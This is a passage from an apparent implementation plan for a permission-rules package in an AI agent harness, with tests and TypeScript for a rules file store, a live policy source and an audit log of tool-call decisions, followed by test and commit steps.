    )
    await source.load()
    expect(source.rules().map(rule => rule.id)).toEqual(['c1', 'f1'])
    expect(await decisionFor(source, 'ls -la')).toBe('allow')
    expect(await decisionFor(source, 'rm x')).toBe('deny')
    expect(source.tables).toBe(tables)
  })

  it('throws for invalid Config rules', async () => {
    const { source } = await setup([{ id: 'bad', decision: 'allow' }])
    await expect(source.load()).rejects.toThrow('air-permission-rules: invalid configuration:\nrule "bad": must name exactly one of tool or capability')
  })

  it('throws for an invalid rules file', async () => {
    const { source } = await setup([], '{ broken')
    await expect(source.load()).rejects.toThrow(/not valid JSON/)
  })

  it('asks for bash before load', async () => {
    const { source } = await setup()
    expect(evaluate(await source.current(), { tool: 'bash', args: { command: 'ls' }, cwd: undefined }).decision).toBe('ask')
  })
})

describe('PolicySource.current', () => {
  it('picks up a hand edit of the rules file', async () => {
    const { source, path, reports } = await setup()
    await source.load()
    expect(await decisionFor(source, 'ls')).toBe('ask')
    await writeFile(path, fileOf([{ id: 'f1', decision: 'allow', tool: 'bash', match: { command: 'ls*' } }]))
    expect(await decisionFor(source, 'ls')).toBe('allow')
    expect(reports).toEqual([])
  })

  it('keeps the previous policy and reports once when the file becomes unreadable', async () => {
    const { source, path, reports } = await setup([], fileOf([{ id: 'f1', decision: 'allow', tool: 'bash' }]))
    await source.load()
    await writeFile(path, '{ broken')
    expect(await decisionFor(source, 'ls')).toBe('allow')
    expect(await decisionFor(source, 'ls')).toBe('allow')
    expect(reports).toHaveLength(1)
    expect(reports[0]).toMatch(/^rules file ignored until it is fixed: .*not valid JSON/)
  })

  it('keeps the previous policy when the new rules do not validate', async () => {
    const { source, path, reports } = await setup([{ id: 'c1', decision: 'allow', tool: 'bash' }])
    await source.load()
    await writeFile(path, fileOf([{ id: 'c1', decision: 'deny', tool: 'bash' }]))
    expect(await decisionFor(source, 'ls')).toBe('allow')
    expect(reports).toEqual(['rules change ignored:\nrule "c1": duplicate id'])
  })
})

describe('PolicySource.add and remove', () => {
  it('adds a rule to the file and applies it at once', async () => {
    const { source, path } = await setup()
    await source.load()
    await source.add({ id: 'f1', decision: 'allow', tool: 'bash', match: { command: 'ls*' } })
    expect(await decisionFor(source, 'ls')).toBe('allow')
    expect(JSON.parse(await readFile(path, 'utf8'))).toEqual({
      version: 1,
      rules: [{ id: 'f1', decision: 'allow', tool: 'bash', match: { command: 'ls*' } }],
    })
  })

  it('rejects a rule that does not validate and leaves the file alone', async () => {
    const { source, path } = await setup([{ id: 'c1', decision: 'allow', tool: 'bash' }])
    await source.load()
    await expect(source.add({ id: 'c1', decision: 'deny', tool: 'bash' })).rejects.toThrow('rule "c1": duplicate id')
    await expect(readFile(path, 'utf8')).rejects.toThrow(/ENOENT/)
  })

  it('removes a file rule and reports whether it existed', async () => {
    const { source } = await setup([{ id: 'c1', decision: 'deny', tool: 'write' }], fileOf([{ id: 'f1', decision: 'allow', tool: 'bash' }]))
    await source.load()
    expect(await source.remove('f1')).toBe(true)
    expect(await decisionFor(source, 'ls')).toBe('ask')
    expect(await source.remove('f1')).toBe(false)
    expect(await source.remove('c1')).toBe(false)
    expect(source.rules().map(rule => rule.id)).toEqual(['c1'])
  })
})
```

- [ ] **Step 3: Write the failing audit tests**

`air/packages/permission-rules/tests/audit.spec.ts`:

```ts
import { mkdtemp, readFile, rm, stat } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, describe, expect, it } from 'vitest'
import { argsDigest, AuditLog, type AuditRecord } from '../src/audit.ts'

const created: string[] = []

async function tempDir(): Promise<string> {
  const dir = await mkdtemp(join(tmpdir(), 'air-audit-'))
  created.push(dir)
  return dir
}

function record(callId: string): AuditRecord {
  return {
    time: '2026-09-30T00:00:00.000Z',
    origin: 'pre-execute',
    sessionId: 's1',
    callId,
    tool: 'bash',
    decision: 'allow',
    grantedBy: 'rule',
    ruleId: 'r1',
    capability: 'shell.execute',
    risk: 'high',
    outcome: null,
    argsDigest: argsDigest({ command: 'ls' }),
  }
}

afterEach(async () => {
  for (const dir of created.splice(0)) await rm(dir, { recursive: true, force: true })
})

describe('AuditLog', () => {
  it('creates the directory and appends one JSON line per record in call order', async () => {
    const path = join(await tempDir(), 'permissions', 'audit.jsonl')
    const log = new AuditLog(path)
    await Promise.all(['c1', 'c2', 'c3', 'c4'].map(id => log.append(record(id))))
    const lines = (await readFile(path, 'utf8')).trimEnd().split('\n').map(line => JSON.parse(line) as AuditRecord)
    expect(lines.map(line => line.callId)).toEqual(['c1', 'c2', 'c3', 'c4'])
    expect(lines[0]).toEqual(record('c1'))
    expect((await stat(path)).mode & 0o777).toBe(0o600)
  })

  it('rejects the failed append and still accepts later ones', async () => {
    const dir = await tempDir()
    const blocked = new AuditLog(dir)
    await expect(blocked.append(record('c1'))).rejects.toThrow(/EISDIR/)
    await expect(blocked.append(record('c2'))).rejects.toThrow(/EISDIR/)
  })
})

describe('argsDigest', () => {
  it('is 16 hexadecimal characters and ignores key order at every depth', () => {
    const a = argsDigest({ command: 'ls', options: { b: [1, { y: 2, x: 1 }], a: true } })
    const b = argsDigest({ options: { a: true, b: [1, { x: 1, y: 2 }] }, command: 'ls' })
    expect(a).toMatch(/^[0-9a-f]{16}$/)
    expect(a).toBe(b)
  })

  it('changes with a value', () => {
    expect(argsDigest({ command: 'ls' })).not.toBe(argsDigest({ command: 'ls -la' }))
  })
})
```

- [ ] **Step 4: Run the tests to verify they fail**

Run: `pnpm -C /home/hxman/AIR-harness/air/packages/permission-rules test`
Expected: FAIL; `../src/rule-store.ts`, `../src/policy-source.ts`, and `../src/audit.ts` cannot be resolved; the three earlier files pass.

- [ ] **Step 5: Write the rule store**

`air/packages/permission-rules/src/rule-store.ts`:

```ts
/** The rules file written by `/allow` and `/deny`: `{ "version": 1, "rules": [...] }`. */
import { mkdir, readFile, stat } from 'node:fs/promises'
import { dirname } from 'node:path'
import { withFileLock, writeFileAtomic } from '@deepseek-ai/dsh-atomic-write'
import { isRecord } from '@air/dsh-convention-core'
import type { Decision, RuleInput } from './types.ts'

const VERSION = 1
const UNREAD = 'unread'
const MISSING = 'missing'
const FILE_MODE = 0o600
const DIR_MODE = 0o700

function isDecision(value: unknown): value is Decision {
  return value === 'allow' || value === 'ask' || value === 'deny'
}

function isPatternMap(value: unknown): value is Record<string, string> {
  return isRecord(value) && Object.values(value).every(pattern => typeof pattern === 'string')
}

function ruleOf(item: unknown, index: number, path: string): RuleInput {
  const at = `${path}: rules[${String(index)}]`
  if (!isRecord(item) || typeof item.id !== 'string' || !isDecision(item.decision)) {
    throw new Error(`${at} needs a string id and a decision of allow, ask, or deny`)
  }
  const { tool, capability, match } = item
  if (tool !== undefined && typeof tool !== 'string') throw new Error(`${at}.tool must be a string`)
  if (capability !== undefined && typeof capability !== 'string') throw new Error(`${at}.capability must be a string`)
  if (match !== undefined && !isPatternMap(match)) throw new Error(`${at}.match must map argument names to string patterns`)
  return {
    id: item.id,
    decision: item.decision,
    ...tool === undefined ? {} : { tool },
    ...capability === undefined ? {} : { capability },
    ...match === undefined ? {} : { match },
  }
}

/**
 * Parse and structurally validate a rules file. Rule semantics (known
 * capabilities, unique ids) are checked later by `compilePolicy`.
 * @param text - file content.
 * @param path - file path used in error messages.
 * @returns the rules in file order.
 * @throws Error naming the path and the first invalid part.
 */
export function parseRulesFile(text: string, path: string): RuleInput[] {
  let data: unknown
  try {
    data = JSON.parse(text)
  } catch (error: unknown) {
    throw new Error(`${path}: not valid JSON: ${String(error)}`, { cause: error })
  }
  if (!isRecord(data) || data.version !== VERSION || !Array.isArray(data.rules)) {
    throw new Error(`${path}: expected { "version": 1, "rules": [...] }`)
  }
  return data.rules.map((item: unknown, index) => ruleOf(item, index, path))
}

async function stampOf(path: string): Promise<string> {
  let info
  try {
    info = await stat(path)
  } catch (error: unknown) {
    if (error instanceof Error && 'code' in error && error.code === 'ENOENT') return MISSING
    throw error
  }
  return `${String(info.mtimeMs)}:${String(info.size)}`
}

/** Reader and writer of one rules file. Writers are serialized by a lock file and commit with an atomic rename. */
export class RuleStore {
  private rules: readonly RuleInput[] = []
  private stamp = UNREAD

  /** @param path - absolute path of the rules file; it and its directory are created on the first write. */
  constructor(readonly path: string) {}

  /** @returns the rules read by the last successful {@link refresh} or {@link update}. */
  list(): readonly RuleInput[] {
    return this.rules
  }

  /**
   * Re-read the file when its modification time or size changed.
   * @returns whether the rule list was replaced.
   * @throws when the file is invalid. The previous list stays, and the same file version is not parsed again.
   */
  async refresh(): Promise<boolean> {
    const stamp = await stampOf(this.path)
    if (stamp === this.stamp) return false
    this.stamp = stamp
    this.rules = stamp === MISSING ? [] : parseRulesFile(await readFile(this.path, 'utf8'), this.path)
    return true
  }

  /**
   * Replace the rule list under the file lock. The change is applied to the
   * file as it is on disk at that moment.
   * @param change - returns the next list; a throw aborts the update before anything is written.
   * @throws when the current file is invalid (it is not overwritten) or the write fails.
   */
  async update(change: (rules: readonly RuleInput[]) => readonly RuleInput[]): Promise<void> {
    await mkdir(dirname(this.path), { recursive: true, mode: DIR_MODE })
    await withFileLock(this.path, async () => {
      this.stamp = UNREAD
      await this.refresh()
      const next = change(this.rules)
      const text = `${JSON.stringify({ version: VERSION, rules: next }, null, 2)}\n`
      await writeFileAtomic(this.path, text, { mode: FILE_MODE, dirMode: DIR_MODE })
      this.rules = next
      this.stamp = await stampOf(this.path)
    })
  }
}
```

- [ ] **Step 6: Write the policy source**

`air/packages/permission-rules/src/policy-source.ts`:

```ts
/** The live policy: Config rules followed by the rules file, recompiled when the file changes. */
import { compilePolicy, type CompiledPolicy } from './policy.ts'
import type { RuleStore } from './rule-store.ts'
import type { PolicyTables, RuleInput } from './types.ts'

function messageOf(error: unknown): string {
  return error instanceof Error ? error.message : String(error)
}

/** Owns the compiled policy and every change to the rules file. */
export class PolicySource {
  private policy: CompiledPolicy

  /**
   * @param tables - capability table, tool scopes, and unscoped defaults from Config.
   * @param configRules - static rules from Config; they precede file rules.
   * @param store - the rules file.
   * @param report - receives one message for each rules-file version that is ignored.
   */
  constructor(
    readonly tables: PolicyTables,
    private readonly configRules: readonly RuleInput[],
    private readonly store: RuleStore,
    private readonly report: (message: string) => void,
  ) {
    this.policy = compilePolicy(tables, []).policy
  }

  /** @returns Config rules followed by file rules. */
  rules(): readonly RuleInput[] {
    return [...this.configRules, ...this.store.list()]
  }

  /**
   * Read the rules file and compile the first policy.
   * @throws when the tables, the Config rules, or the rules file are invalid.
   */
  async load(): Promise<void> {
    await this.store.refresh()
    const next = compilePolicy(this.tables, this.rules())
    if (next.problems.length > 0) {
      throw new Error(`air-permission-rules: invalid configuration:\n${next.problems.join('\n')}`)
    }
    this.policy = next.policy
  }

  /**
   * The policy for the next decision. A changed rules file is read first; an
   * invalid file or invalid rules are reported once and the previous policy stays.
   * @returns the current compiled policy.
   */
  async current(): Promise<CompiledPolicy> {
    let changed: boolean
    try {
      changed = await this.store.refresh()
    } catch (error: unknown) {
      this.report(`rules file ignored until it is fixed: ${messageOf(error)}`)
      return this.policy
    }
    if (changed) this.adopt()
    return this.policy
  }

  /**
   * Append one rule to the rules file.
   * @param rule - the rule; its id must be unused.
   * @throws when the rule set would not validate (nothing is written) or the write fails.
   */
  async add(rule: RuleInput): Promise<void> {
    await this.store.update((fileRules) => {
      const next = [...fileRules, rule]
      const { problems } = compilePolicy(this.tables, [...this.configRules, ...next])
      if (problems.length > 0) throw new Error(problems.join('\n'))
      return next
    })
    this.adopt()
  }

  /**
   * Remove one rule from the rules file. Config rules cannot be removed here.
   * @param id - rule id.
   * @returns whether the file contained the rule.
   */
  async remove(id: string): Promise<boolean> {
    let removed = false
    await this.store.update((fileRules) => {
      const next = fileRules.filter(rule => rule.id !== id)
      removed = next.length !== fileRules.length
      return next
    })
    this.adopt()
    return removed
  }

  private adopt(): void {
    const next = compilePolicy(this.tables, this.rules())
    if (next.problems.length > 0) {
      this.report(`rules change ignored:\n${next.problems.join('\n')}`)
      return
    }
    this.policy = next.policy
  }
}
```

- [ ] **Step 7: Write the audit log**

`air/packages/permission-rules/src/audit.ts`:

```ts
/** AIR-owned audit file: one JSON line per policy decision that the session log does not show as a human decision. */
import { createHash } from 'node:crypto'
import { appendFile, mkdir } from 'node:fs/promises'
import { dirname } from 'node:path'
import { isRecord } from '@air/dsh-convention-core'
import type { Decision, Risk } from './types.ts'

const FILE_MODE = 0o600
const DIR_MODE = 0o700
const DIGEST_CHARS = 16

/** One audit line. Arguments are never written; `argsDigest` identifies them. */
export interface AuditRecord {
  /** ISO 8601 time of the decision. */
  readonly time: string
  /** Which hook produced the record. */
  readonly origin: 'pre-execute' | 'approval-request' | 'sudo-guard'
  readonly sessionId: string | null
  readonly callId: string
  readonly tool: string
  readonly decision: Decision
  /** Who granted an `allow`: a rule, a capability default, or a person. Null for `ask` and `deny`. */
  readonly grantedBy: 'rule' | 'default' | 'human' | null
  readonly ruleId: string | null
  readonly capability: string | null
  readonly risk: Risk | null
  /** The approval outcome for `approval-request` records answered by a person; otherwise null. */
  readonly outcome: string | null
  readonly argsDigest: string
}

function canonical(value: unknown): unknown {
  if (Array.isArray(value)) return value.map(canonical)
  if (isRecord(value)) return Object.fromEntries(Object.keys(value).sort().map(key => [key, canonical(value[key])]))
  return value
}

/**
 * Digest the arguments of a call for correlation without storing them.
 * @param args - parsed tool arguments.
 * @returns the first 16 hexadecimal characters of the SHA-256 of the key-sorted JSON.
 */
export function argsDigest(args: Readonly<Record<string, unknown>>): string {
  return createHash('sha256').update(JSON.stringify(canonical(args))).digest('hex').slice(0, DIGEST_CHARS)
}

/** Serialized appender for the audit file. */
export class AuditLog {
  private tail: Promise<void> = Promise.resolve()

  /** @param path - absolute path of the JSONL file; it and its directory are created on the first append. */
  constructor(private readonly path: string) {}

  /**
   * Append one record after every earlier append has settled.
   * @param record - the audit line.
   * @returns settlement of this append; a failure rejects here and does not block later appends.
   */
  append(record: AuditRecord): Promise<void> {
    const write = this.tail.then(() => this.write(record))
    // The caller receives the failure through `write`; the tail only orders appends.
    this.tail = write.then(() => undefined, () => undefined)
    return write
  }

  private async write(record: AuditRecord): Promise<void> {
    await mkdir(dirname(this.path), { recursive: true, mode: DIR_MODE })
    await appendFile(this.path, `${JSON.stringify(record)}\n`, { mode: FILE_MODE })
  }
}
```

- [ ] **Step 8: Run the tests to verify they pass**

Run: `pnpm -C /home/hxman/AIR-harness/air/packages/permission-rules test`
Expected: `Test Files 6 passed (6)`.

- [ ] **Step 9: Typecheck and commit**

Run: `pnpm -C /home/hxman/AIR-harness/air/packages/permission-rules typecheck`
Expected: exit 0.

```bash
cd /home/hxman/AIR-harness
git add air/packages/permission-rules
git commit -m "feat(air): add the permission rules file, live policy source, and audit log"
```

---
